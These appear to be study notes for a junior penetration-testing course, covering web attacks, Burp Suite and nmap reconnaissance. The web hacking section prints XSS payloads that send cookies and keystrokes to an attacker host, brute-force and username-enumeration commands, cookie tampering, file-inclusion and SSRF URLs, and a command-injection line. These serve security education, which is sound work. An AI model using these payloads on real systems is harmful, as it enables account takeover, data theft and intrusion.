# Jr Penetration Tester

1. [Introduction to Pentesting](#introduction-to-pentesting)
2. [Introduction to Web Hacking](#introduction-to-web-hacking)
3. [Burp Suite](#burp-suite)
4. [Network Security](#network-security)
5. [Vulnerability Research](#vulnerability-research)
6. [Metasploit](#metasploit)
7. [Privilege Escalation](#privilege-escalation)

## Introduction to Pentesting

---

* Pentest (Penetration test) - ethical attempt to test & analyze security to protect assets; involves using tools and techniques to attempt breaking the system; authorised audit.

* ROE (Rules of Engagement) - document created at initial stages of pentest, includes permission, test scope and rules.

* Stages of pentest:

  1. Information gathering
  2. Enumeration, scanning
  3. Exploitation
  4. Privilege escalation
  5. Post-exploitation (pivoting, covering tracks, reporting)

* Pentest methodologies:

  * OSSTMM (Open Source Security Testing Methodology Manual)
  * OWASP (Open Web Application Security Project)
  * NIST (National Institute of Standards and Technology) Cybersecurity Framework
  * NCSC CAF (National Cyber Security Centre - Cyber Assessment Framework)

* Types of pentests:

  * Black-box testing - No knowledge; high-level process
  * Grey-box testing - Partial knowledge
  * White-box testing - Full knowledge; low-level process

* CIA triad - Confidentiality, Integrity and Availability.

* PIM (Privileged Identity Management) - used to translate a user's role within an organisation into an access role on a system.

* PAM (Privileged Access Management) - management of privileges a system's access role has.

* Threat modelling - process of reviewing, improving and testing security protocols in place in an organisation's IT infra and services.

* A threat model includes:

  * Threat intelligence
  * Asset identification
  * Mitigation capabilities
  * Risk assessment

## Introduction to Web Hacking

---

* We can manually review a web app for security issues using in-built tools in our browser, such as View Source, Inspector, Debugger, Network, etc.

* The three methods of Content Discovery in web apps are:
  
  * Manual -

    ```shell
    #We can use the favicon link of a website to find the framework used
    curl https://website.com/favicon.ico | md5sum
    #this calculates md5 hash value after downloading the favicon
    #hash can be used to lookup on <https://wiki.owasp.org/index.php/OWASP_favicon_database>
    ```

    ```shell
    #Manually discovering HTTP headers
    curl http://website.com/ -v
    ```

  * Automated -

    ```shell
    #using wordlists
    #common tools are ffuf, dirb, gobuster - all do the same function
    ffuf -w /usr/share/wordlists/dirbuster.txt -u http://10.0.2.7/FUZZ

    dirb http://10.0.2.7/ /usr/share/wordlists/dirbuster.txt

    gobuster dir --url http://10.0.2.7/ -w /usr/share/wordlists/dirbuster.txt
    ```

  * OSINT (Open Source Intelligence) - OSINT includes methods such as advanced Google searching, checking archives or using applications such as Wappalyzer and S3 buckets.

* Subdomain enumeration - finding valid subdomains for a domain. Its methods are:

  * OSINT - using public info with the help of sites such as <http://crt.sh/> and <https://transparencyreport.google.com/https/certificates> to get a list of SSL/TLS certificates and discover subdomains. OSINT includes advanced Googling as well as using automated tools like ```Sublist3r```

  * Bruteforce - bruteforce DNS enumeration is trying different possible subdomains from a list of commonly used ones. As it involves a high number of requests, it is automated using tools such as ```dnsrecon```.

  * Virtual hosts - as some subdomains are not always hosted in public DNS results and are instead stored in private DNS server or in developer's machines in '/etc/hosts' file, we can use the Host header when accessing websites and modify it. This process can be automated too.

    ```shell
    ffuf -w /usr/share/wordlists/dnsnamelist.txt -H "Host:FUZZ.acmeitsupport.thm" -u http://10.10.3.35 -fs {size} #replace {size} with any page size
    #-H flag is used for header
    #-fs is used for filtering output by page size
    ```

* Authentication bypass:

  * Username enumeration -

    ```shell
    #a list of valid usernames can be created on basis of error message
    ffuf -w /usr/share/wordlists/names.txt -X POST -d "username=FUZZ&email=x&password=x" -H "Content-Type:application/x-www-form-urlencoded" -u http://10.10.131.237/customers/signup -mr "username already exists"
    #-X specifies request method
    #-d is for data that we will send
    #-H is for extra headers added to request
    #-mr is the text or error we are looking for a valid username
    ```

  * Brute force -

    ```shell
    #we can use valid usernames to brute force login pages
    ffuf -w valid_usernames.txt:W1, /usr/share/wordlists/passwords.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.131.237/customers/login -fc 200
    #multiple wordlists, so instead of using FUZZ we have to use custom terms
    #-fc is used for status code other than 200, for positive match
    ```

  * Logic flaw - typical logical path of app is bypassed, circumvented or manipulated.

  * Cookie tampering - For plaintext cookies, we can simply modify cookies. For hashed cookies, however, we have to use resources such as <https://crackstation.net/>. If the cookies are encoded using base32 or base64, we can simply decode, modify and encode the cookie string to bypass login.

    ```shell
    curl http://10.10.131.237/cookie-test #returns message 'Not Logged In'

    curl -H "Cookie: logged_in=true;admin=false" http://10.10.131.237/cookie-test #logged in

    curl -H "Cookie: logged_in=true;admin=true" http://10.10.131.237/cookie-test #logged in as Admin
    ```

* IDOR (Insecure Direct Object Reference) - a type of access control vulnerability; occurs when a web server receives user input to retrieve objects without validation on server-side to confirm the requested object belongs to the one requesting it. Examples include:

  * Websites such as <https://website.com/profile?userid=1002>, where the userid field can be manipulated.

  * Data being sent to server is encoded using base64. In these instances, we can simply decode and encode modified data and submit it.

  * Hashing IDs; if they are predictable, they can be cracked using services like <https://crackstation.net/>.

  * IDOR detection by creating two accounts on the same website, and swapping the IDs between them. If the other users' content can be viewed using their ID but not by logging into their account, then it is a valid IDOR vulnerability.

* File inclusion vulnerabilities:

  * Local File Inclusion (LFI) -

    * due to lack of security awareness in developers, PHP functions such as ```include```, ```require```, ```include_once```, ```require_once``` can cause this vulnerability.

    * Examples include changing URL to <http://webapp.thm/get.php?file=/etc/passwd> (this would work when no directories are specified in functions) and transforming URL to <http://webapp.thm/index.php?lang=../../../../etc/passwd> (similar to path traversal).

  * Remote File Inclusion (RFI) -

    * to include remote files into a vulnerable app, this is also due to improper sanitation of user input.

    * requirement for RFI is that ```allow_url_fopen``` should be on, because external URL has to be injected using include.

    * higher risk as it can allow to gain RCE (Remote Command Execution), do sensitive info disclosure or other attacks such as XSS and DoS.

  * Directory traversal (path traversal or dot-dot-slash attack) -
  
    * allows attacker to read OS resources, local files on the server by manipulating web app's URL to access directories outside root directory.

    * occur when user's input is passed to a function (e.g. - ```file_get_contents``` in PHP).

    * poor input validation or filtering can also cause this:

    * Examples include modifying <http://webapp.thm/get.php?file=usercv.pdf> to <http://webapp.thm/get.php?file=../../../../etc/passwd>, or for a Windows machine, it can be changing the link into <http://webapp.thm/get.php?file=../../../../boot.ini> or <http://webapp.thm/get.php?file=../../../../windows/win.ini>

* SSRF (Server Side Request Forgery) - vulnerability that allows user to cause webserver make an extra or edited HTTP request to any resource that attacker wants. There are 2 types of SSRF vulnerability - one is regular, where data is returned to attacker's screen; another type is blind SSRF, in which SSRF occurs but no info is returned to screen. Examples include:

  * Expected request - <http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123>

    Modified request - <http://website.thm/stock?url=http://api.website.thm/api/user>

    Website requests - <http://api.website.thm/api/user>

  * Expected request - <http://website.thm/stock?url=/item?id=123>

    Modified request - <http://website.thm/stock?url=/../user>

    Website requests - <http://api.website.thm/api/stock/../user> (gives /api/user)

  * Expected request - <http://website.thm/stock?server=api&id=123>

    Modified request - <http://website.thm/stock?server=api.website.thm/api/user&x=&id=123>
    (&x= is a payload here, to stop remaining path appending to URL, instead it turns it into a parameter)

    Website requests - <http://api.website.thm/api/user?x=.website.thm/api/stock/item?id=123>

  * Expected request - <http://website.thm/stock?url=http://api.website.thm/api/stock/item?id=123>

    Modified request - <http://website.thm/stock?url=http://hacker.domain.thm/>
    (this helps in capturing request headers sent to attacker's domain, and the headers could contain authentication credentials or API keys)

    Website requests - <http://hacker.domain.thm/>
  
  * Possible SSRF vulnerabilities, can be discovered with <https://requestbin.com/> too -

    * When full URL is used in a parameter in address bar

    * A hidden field in a form

    * A partial URL like just the hostname

    * Only path of URL

* XSS (Cross-Site Scripting) - Injection attack where malicious JS gets injected into web app for other users to execute. Examples -

  * Proof of concept:

    ```js
    <script>
      alert('XSS');
    </script>
    ```
  
  * Session stealing:

    ```js
    <script>
      fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));
    </script>
    ```

  * Key Logger:

    ```js
    <script>
      document.onkeypress = function(e) {fetch('https://hacker.thm/log?key=' + btoa(e.key));}
    </script>
    ```

  * Business Logic:

    ```js
    <script>
      user.changeEmail('attacker@hacker.thm'); //a particular function is called
    </script>
    ```

* Types of XSS:

  1. Reflected XSS - user-supplied data in HTTP request is included in webpage source without validation. It can be tested at every point of entry, including parameters in URL and URL file path.

  2. Stored XSS - payload is stored on the web app and then gets run when users visit the page. It can be tested at every point of entry where data can be stored, like comments on a blog, user profile information, etc.

  3. DOM-Based XSS - JS execution happens directly in browser without loading pages or submitting data. It happens when JS code acts as input or user interaction. Examples can be using the 'window.location.x' parameters for the attacker to gain control, or unsafe methods such as 'eval()'.

  4. Blind XSS - similar to stored XSS, but we cannot see the payload working. To test for blind XSS, we need to ensure the payload has a call-back (like a HTTP request) to know if code is getting executed. Tools like ```xsshunter``` can be used for blind XSS attacks.

* XSS polyglot - string of text which can escape attributes, tags and bypass filters all in one. Example - ```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e```

* Command injection - abusing the web app's power to execute commands on the OS. This is also known as RCE (Remote Code Execution). This vulnerability exists because apps use functions to pass data and make system calls on the machine's OS.

  * In command injection, ```;```, ```&``` and ```&&``` can be used as shell operators to combine multiple system commands and execute them.

  * Command injection can be blind or verbose; the former gives no direct output while testing payloads whereas the latter includes feedback.

  * For blind command injection, we need to use payloads that will cause time delay, like ```ping``` and ```sleep```. We can also use commands to force output, like ```>``` to read a file.

  * ```curl``` can be used to test for command injection as it is used to deliver data to and from an app in the payload:

    ```shell
    curl http://vulnerable.app/process.php%3Fsearch%3DThe%20Beatles%3B%20whoami
    ```
  
  * Common payloads for Linux machines - ```whoami```, ```ls```, ```ping```, ```sleep```, ```nc```

  * Common payloads for Windows machines - ```whoami```, ```dir```, ```ping```, ```timeout```

  * Functions vulnerable to command injection - ```exec```, ```passthru```, ```system```

  * Input sanitisation can be used to prevent command injection vulnerabilities; however, payloads can use hexadecimal values to bypass filters.

* SQL Injection (SQLi) - attack on web app database server that causes malicious queries to be executed. This happens when user-provided data is included in SQL query. For example -

  ```shell
  URL - https://website.thm/blog?id=1

  Modified URL - https://website.thm/blog?id=2;--
  #semicolon to end SQL statement and two dashes for comments
  ```

* Types of SQLi:

  * In-Band SQLi - easiest to detect and exploit; refers to same method of communication being used to exploit the vulnerability and also receive the results. Common types are:

    * Error-based SQLi - error messages from database are printed directly to browser screen, can be used to enumerate a whole database.

    * Union-based SQLi - uses UNION operator with SELECT statement to return extra info to page, can extract more data.

  * Blind SQLi - we get little to no feedback to confirm our injected queries' success. Common types are:
  
    * Authentication bypass - blind SQLi can be used in bypassing authentication methods. Queries which return true/false are used in these scenarios.

    * Boolean-based - refers to response received back from injection attempts, could be true/false, yes/no, 1/0, etc.

    * Time-based - no visual indicator of queries being right or wrong; instead the query is based on the time the query takes to complete. Methods such as ```sleep(x)``` are used along with UNION statement.
  
  * Out-of-Band SQLi - not common as it depends on specific features being enabled in database server or web app, which makes external network calls based on results from SQL query. Such attacks have two different communication channels, one to launch attack and the other to gather results.

* SQLi attacks can be prevented by using prepared statements (parameterized queries), input validation and escaping user input.

## Burp Suite

---

* Burp Suite - framework written in Java that provides tools for web app pentesting. It is used to intercept, view and modify web requests prior to them being sent to the target browser. Some features of Burp Suite (Community edition):

  * Proxy - intercept and modify requests/responses when interacting with web apps.
  * Repeater - capture, modify, then resend the same request multiple times.
  * Intruder - to spray an endpoint with requests, used for brute-forcing or fuzzing endpoints.
  * Decoder - decodes capture info or encodes a payload prior to sending it to the target.
  * Comparer - compare two pieces of data at word/byte level.
  * Sequencer - assess randomness of tokens (like session cookie values).

* Burp Proxy works by opening a web interface on 127.0.0.1:8080 by default. Our browser traffic can be redirected through this port, before intercepting it with Burp, with the help of a browser extension called 'FoxyProxy'.

* While using Burp Proxy, scoping is recommended as it allows us to define what gets proxied and logged, and we can restrict Burp Suite to only target the web apps to be tested.

## Network Security

---

* Recon (reconnaissance) - preliminary survey to gather info about a target. Its types are:

  * Passive recon - we rely on public info.
  * Active recon - requires direct engagement with the target.

* Passive recon examples:

  * WHOIS - request and response protocol -

    * A WHOIS server listens on TCP port 43 for incoming requests.

    * Domain registrar maintains the WHOIS records for the domain names it is leasing.

    * WHOIS server replies with info related to the domain requested, such as registrar, contact info, name server, and creation, update and expiration dates.

  * To get WHOIS info, we can use a ```whois``` client or an online service. The syntax is ```whois DOMAIN_NAME```.

  * We can find the IP address of a domain name using ```nslookup DOMAIN_NAME```. For a general query, we can use ```nslookup OPTIONS DOMAIN_NAME SERVER```. For example, ```nslookup -type=A tryhackme.com 1.1.1.1```.

  * For more advanced DNS queries, we can use ```dig @SERVER DOMAIN_NAME TYPE```.

  * DNSDumpster is an online tool which offers detailed answers to DNS queries. It also provides any collected info about listening servers.

  * Shodan.io is a service which gives us info about the client's network without actively connecting to it. It tries to connect to every device reachable online to build a search engine of connected data.

* Active recon examples:

  * We can use a web browser to gather info about the target:

    * Developer tools in browser give us info about code used.

    * Extensions such as FoxyProxy, Wappalyzer and User-Agent Switcher & Manager.

  * ```ping``` can be used to check if remote system is online. The syntax is ```ping -c 10 MACHINE_IP```.

  * ```traceroute``` is used to find the IP addresses of the routers that a packet traverses as it goes from our system to target host. Syntax is ```traceroute MACHINE_IP```.

  * ```telnet``` can be used to connect to any service and grab its banner. Syntax is ```telnet MACHINE_IP PORT_NUMBER```.

  * ```nc``` can be used as a client to connect to a listening port, and as a server to listen on a port. For netcat as client, syntax is ```nc MACHINE_IP PORT_NUMBER```; and for netcat as server, syntax is ```nc -lvnp PORT_NUMBER```.

* ```nmap``` can be used for enumerating targets, which we can specify as:

  * list - ```MACHINE_IP scanme.nmap.org example.com``` will scan 3 IP addresses.

  * range - ```10.11.12.15-20``` will scan 6 addresses.

  * subnet - ```MACHINE_IP/30``` will scan 4 addresses.

  * file - ```nmap -iL hosts_list.txt```.

* ```nmap``` uses the following approach to discover live hosts:

  * When privileged user tries to scan targets on a local network, ```nmap``` uses ARP requests.

  * When privileged user tries to scan targets outside local network, it uses ICMP echo requests, TCP ACK (port 80), TCP SYN (443) and ICMP timestamp request.

  * When unprivileged user tries to scan targets outside local network, it uses a TCP 3-way handshake by sending SYN packets to 80 and 443.

* ```nmap -PR -sn MACHINE_IP/24``` for ```nmap``` using ARP for host discovery in local network without port scanning.

* ```nmap -PE -sn MACHINE_IP/24``` will send ICMP echo packets to every IP on the subnet without port scan. Here, ```-PP``` can be used instead of ```-PE``` to use ICMP timestamp requests; ```-PM``` can be used for address mask queries.

* ```nmap``` host discovery can be done through TCP and UDP:

  * ```nmap -PS -sn MACHINE_IP/24``` uses TCP SYN ping. We can do this for a range of ports, like ```-PS21-25``` or ```-PS80,443,8080```.

  * ```nmap -PA -sn MACHINE_IP/24``` uses TCP ACK ping.

  * ```nmap -PU -sn MACHINE_IP/24``` uses UDP ping.

* Basic port scans:

  * ```nmap -sT MACHINE_IP``` - TCP connect scan.

  * ```nmap -sS MACHINE_IP``` - TCP SYN scan.

  * ```nmap -sU MACHINE_IP``` - UDP scan.

* Advanced port scans (can be used for stateless firewalls) :

  * ```nmap -sN MACHINE_IP``` - TCP Null scan.

  * ```nmap -sF MACHINE_IP``` - FIN scan.

  * ```nmap -sX MACHINE_IP``` - Xmas scan.

  * ```nmap -sM MACHINE_IP``` - TCP Maimon scan (outdated).

  * ```nmap -sA MACHINE_IP``` - TCP ACK scan (for discovering firewall rules).

  * ```nmap -sW MACHINE_IP``` - TCP window scan (for discovering firewall rules).

  * ```nmap --scanflags RSTSYNFIN MACHINE_IP``` - custom scan (using flag names).

  * ```nmap -e NET_INTERFACE -Pn -S SPOOFED_IP MACHINE_IP``` - scan using spoofed IP.

  * ```nmap -D 10.10.0.1, 10.10.0.2, MY_IP, 10.10.114.196``` - decoy scan.

  * ```nmap -sI ZOMBIE_IP MACHINE_IP``` - idle/zombie scan.

  * Use ```--reason``` for explanation, ```-v``` or ```-vv``` for verbosity, and ```-d``` or ```-dd``` for debugging.

## Vulnerability Research

---

## Metasploit

---

## Privilege Escalation

---
